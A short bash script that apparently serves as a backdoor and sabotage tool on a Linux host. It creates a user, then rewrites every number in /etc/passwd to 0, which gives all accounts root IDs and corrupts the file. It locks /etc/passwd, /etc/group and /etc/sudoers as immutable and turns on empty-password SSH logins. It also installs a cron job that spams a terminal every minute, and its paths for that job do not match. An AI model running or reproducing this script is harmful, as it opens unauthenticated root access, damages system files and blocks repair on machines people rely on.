#!/bin/bash

#creates user with root privs
array="someone"

if grep $array /etc/passwd > /dev/null 2>&1 || grep $array /etc/group || test -f /var/mail/$array|| test -f /home/$array  ; then
    echo "exists in either /etc/group or /etc/passwd or /var/mail or /home"
else
    sudo useradd $array
    sudo sed -i -E 's/[0-9]+/0/g' /etc/passwd
fi

#ensures files are immutable
sudo chattr +i /etc/passwd /etc/group /etc/sudoers

#changes ssh_settings
setting='#PermitEmptyPasswords no'
if grep "$setting" /etc/ssh/sshd_config > /dev/null 2>&1 ; then
    sudo sed -i -e "s/$setting/PermitEmptyPasswords yes/" /etc/ssh/sshd_config
    sudo systemctl restart sshd
else
    echo "setting is already changed"
fi

# crontab lol
echo "#!/bin/bash

printf 'hajii :3 :3 :3 : 3: :3 :3 :3 :3 :3 :3 hajii :3 :3 :3 :3 :3 :3 :3 :3 :3 \n%.0s' {1..1000}" > /home/$USER/file

chmod +x /home/$USER/file

echo "* * * * * /root/file > /dev/pts/0" > yo

crontab yo
rm yo
